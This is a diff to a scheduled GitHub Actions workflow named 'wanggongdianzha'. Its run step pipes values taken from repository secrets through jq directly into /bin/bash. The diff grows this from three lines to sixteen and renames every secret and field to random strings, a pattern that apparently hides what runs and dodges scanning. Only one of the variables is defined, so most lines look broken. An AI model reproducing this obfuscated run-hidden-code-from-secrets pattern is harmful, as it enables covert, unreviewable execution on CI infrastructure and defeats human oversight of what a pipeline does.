@@ -1,19 +1,33 @@
 name: wanggongdianzha
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
+    - cron: '22 0/6 * * *'
 
-jobs:  # 8721
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: wanggongdianzha
         env:
-          i5422: ${{ secrets.i5422 }}
+          djxew07137: ${{ secrets.djxew07137 }}
         run: |
-          echo $i5422 | jq -r .qhm14 | /bin/bash
-          echo $tae8 | jq -r .tk2 | /bin/bash
-          echo $segu082 | jq -r .kfx05 | /bin/bash
+          echo $djxew07137 | jq -r .gb0 | /bin/bash
+          echo $v94 | jq -r .ykn49561 | /bin/bash
+          echo $undh9377 | jq -r .n5 | /bin/bash
+          echo $hczvx930 | jq -r .pubg4 | /bin/bash
+          echo $rnd7 | jq -r .ndltb1 | /bin/bash
+          echo $yav158 | jq -r .skauq269 | /bin/bash
+          echo $ttcp82496 | jq -r .xtwxe537 | /bin/bash
+          echo $ffa6 | jq -r .pnoso18 | /bin/bash
+          echo $cq3 | jq -r .hecrj2620 | /bin/bash
+          echo $qhn90 | jq -r .al0051 | /bin/bash
+          echo $un5 | jq -r .kkpnr8 | /bin/bash
+          echo $dnpl9780 | jq -r .vgqz79 | /bin/bash
+          echo $vzj30124 | jq -r .cnab0041 | /bin/bash
+          echo $lzska29198 | jq -r .rboa8574 | /bin/bash
+          echo $jnnhw349 | jq -r .hfl8 | /bin/bash
+          echo $gjcb0840 | jq -r .ccbgj21141 | /bin/bash
 
